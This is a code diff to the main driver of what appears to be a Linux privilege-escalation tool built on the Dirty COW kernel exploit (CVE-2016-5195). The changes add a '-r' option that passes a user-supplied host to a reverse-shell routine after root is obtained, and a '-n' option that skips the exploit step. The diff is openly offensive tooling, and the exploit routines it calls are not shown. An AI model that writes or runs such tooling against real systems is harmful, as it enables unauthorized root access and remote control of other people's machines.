@@ -8,7 +8,7 @@
 #include "main.h"
 #include "actions.h"
 
-int exploit = 0;
+int exploit = 1;
 int action = 0;
 
 void usage(){
@@ -17,9 +17,11 @@ void usage(){
 	fprintf (stderr, "	-d: (default) Dirtycow CVE-2016-5195\n");
 	fprintf (stderr, "Action options:\n");
 	fprintf (stderr, "	-l: (default) Execute local shell after root is obtained\n");
-	if (exploit == 0)
+	if (exploit == 1)
 		dirtycow_help();
 	if (action == 0)
+		action_local_shell_help();
+	if (action == 1)
 		action_local_shell_help();
 }
 
@@ -28,10 +30,14 @@ int main(int argc,char *argv[]) {
 	self[0] = argv[0];
 	int euid=geteuid();
 	int c;
+	char *cvalue = NULL;
 
-	while ((c = getopt (argc, argv, "dlh")) != -1)
+	while ((c = getopt (argc, argv, "ndlhr:")) != -1)
 	switch (c)
 	{
+		case 'n':
+			exploit = 0;
+			break;
 		case 'd':
 			action = 0;
 			break;
@@ -42,30 +48,34 @@ int main(int argc,char *argv[]) {
 			usage();
 			return 0;
 			break;
-/*		case 'c':
+		case 'r':
+			action = 1;
 			cvalue = optarg;
 			break;
-*/		case '?':
-/*			if (optopt == 'c')
-				fprintf (stderr, "Option -%c requires an argument.\n", optopt);
-			else */ if (isprint (optopt))
-				fprintf (stderr, "Unknown option `-%c'.\n", optopt);
+		case '?':
+			if (optopt == 'r')
+				fprintf (stderr, "[-] Option -%c requires an argument.\n", optopt);
+			else if (isprint (optopt))
+				fprintf (stderr, "[-] Unknown option `-%c'.\n", optopt);
 			else
 				fprintf (stderr,
-					"Unknown option character `\\x%x'.\n",
+					"[-] Unknown option character `\\x%x'.\n",
 					optopt);
 				usage();
 			return 1;
 		}
 
-	printf("Payload running\n");
-	dirtycow_init(euid);
-	if (euid == 0) {
+	printf("[+] Payload running euid: %d exploit: %d action: %d\n", euid, exploit, action);
+	if (exploit == 1)
+		dirtycow_init(euid);
+	if (exploit == 0 || euid == 0) {
+		printf("[+] Action running\n");
 		if (action == 0)
-			action_local_shell();
+			return action_local_shell();
+		else if (action == 1)
+			return action_reverse_shell(cvalue);
 	}
-	printf("From %d to 0!\n", euid);
-	if (exploit == 0)
-		dirtycow_run();
-	return 0;
+	printf("[+] Launching exploit\n");
+	if (exploit == 1)
+		return dirtycow_run();
 }
